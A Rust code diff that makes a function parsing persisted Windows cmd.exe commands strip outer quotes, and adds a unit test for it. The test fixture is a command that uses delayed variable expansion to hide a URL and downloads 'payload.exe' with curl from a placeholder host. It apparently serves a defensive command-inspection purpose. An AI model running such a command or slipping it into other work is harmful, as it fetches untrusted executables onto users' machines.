@@ -1125,6 +1125,7 @@ fn persisted_command_looks_dispatchable(command: &str) -> bool {
 }
 
 pub(crate) fn persisted_command_child(command: &str) -> Option<(String, bool)> {
+    let command = strip_outer_quotes(command.trim()).trim();
     if let Some(inner) = super::cmd::extract_cmd_inner(command) {
         return Some((inner, super::cmd::has_v_on_raw(command)));
     }
@@ -1621,6 +1622,20 @@ mod tests {
             .expect("cmd child should parse");
 
         assert_eq!(child, "echo !USERPROFILE!");
+        assert!(delayed);
+    }
+
+    #[test]
+    fn persisted_command_child_strips_balanced_wrapper_quotes() {
+        let (child, delayed) = persisted_command_child(
+            r#""cmd.exe /V:ON /c set U=https://persisted-quoted.example/payload.exe&&curl -o payload.exe !U!""#,
+        )
+        .expect("quoted cmd child should parse");
+
+        assert_eq!(
+            child,
+            "set U=https://persisted-quoted.example/payload.exe&&curl -o payload.exe !U!"
+        );
         assert!(delayed);
     }
 
